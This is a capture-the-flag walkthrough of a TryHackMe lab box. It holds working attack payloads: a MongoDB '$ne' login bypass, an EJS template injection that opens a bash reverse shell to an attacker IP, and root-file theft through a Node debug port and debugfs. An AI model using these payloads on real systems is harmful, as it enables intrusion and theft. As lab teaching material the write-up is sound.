# THM - Hacker Holidays Day 7: Do Not Disturb
**Category:** Boot2Root
**Difficulty:** Medium

## Tools Used
- nmap
- Gobuster
- Burp Suite
- Browser
- netcat

## Steps

1. Connected to TryHackMe VPN: `sudo openvpn thm.ovpn`
2. Ran `nmap -sC -sV <IP>` — found port 22 (SSH) and port 80 (HTTP/Node.js Express)
3. Ran Gobuster: `gobuster dir -u http://<IP> -w /usr/share/wordlists/dirb/common.txt` — found `/staff` (403) and `/logout` (302)
4. Opened website in browser — found Byte Lotus login page with `attendant` as username placeholder
5. Intercepted login request in Burp Suite — changed `Content-Type` to `application/json` and sent NoSQL injection payload:
```json
   {"username":{"$ne":null},"password":{"$ne":null}}
```
6. Got authenticated session cookie — redirected to `/staff` console as `attendant`
7. Found EJS template editor — tested for SSTI with `<%= 7*7 %>` — output showed `49`, confirming server-side template injection
8. Set up netcat listener on Kali: `nc -lvnp 4444`
9. Submitted reverse shell payload via template box:
<%= global.process.mainModule.require('child_process').execSync('bash -c "bash -i >& /dev/tcp/YOUR_IP/4444 0>&1"').toString() %>
10. Got shell as `poolside`
11. Read user flag: `cat /home/poolside/user.txt`
12. Upgraded shell: `python3 -c 'import pty; pty.spawn("/bin/bash")'`
13. Enumerated running processes: `ps aux` — found `pipelinesvc` running Node.js with `--inspect=127.0.0.1:9229`
14. Confirmed Node debug port was live: `curl http://127.0.0.1:9229/json`
15. Attached to Node inspector: `node inspect 127.0.0.1:9229`
16. Dropped into REPL: typed `repl`
17. Confirmed `pipelinesvc` is in the `disk` group:
```js
    process.getBuiltinModule('child_process').execSync('id').toString()
```
18. Read root flag directly off the raw disk partition using `debugfs`:
```js
    process.getBuiltinModule('child_process').execSync("/usr/sbin/debugfs -R 'cat /root/root.txt' /dev/nvme0n1p1 2>/dev/null").toString()
```

## What I Learned
- NoSQL injection using `$ne` operators bypasses MongoDB authentication when user input is passed directly into query objects — input should never shape query structure
- A `403` on a valid endpoint isn't the end — if auth can be bypassed elsewhere, the session cookie earned that way can unlock it
- EJS SSTI gives full Node.js code execution when user input reaches `ejs.render()` directly — use `process.getBuiltinModule('child_process')` to run system commands
- The Node.js `--inspect` flag exposes a live debug REPL — even bound to `127.0.0.1`, any foothold on the box makes it reachable via `node inspect`
- Group membership can be more dangerous than user identity — `disk` group membership allows raw block device access, bypassing all filesystem permissions entirely
- `debugfs` reads files directly off a raw partition, making root-owned files readable without ever needing a root shell
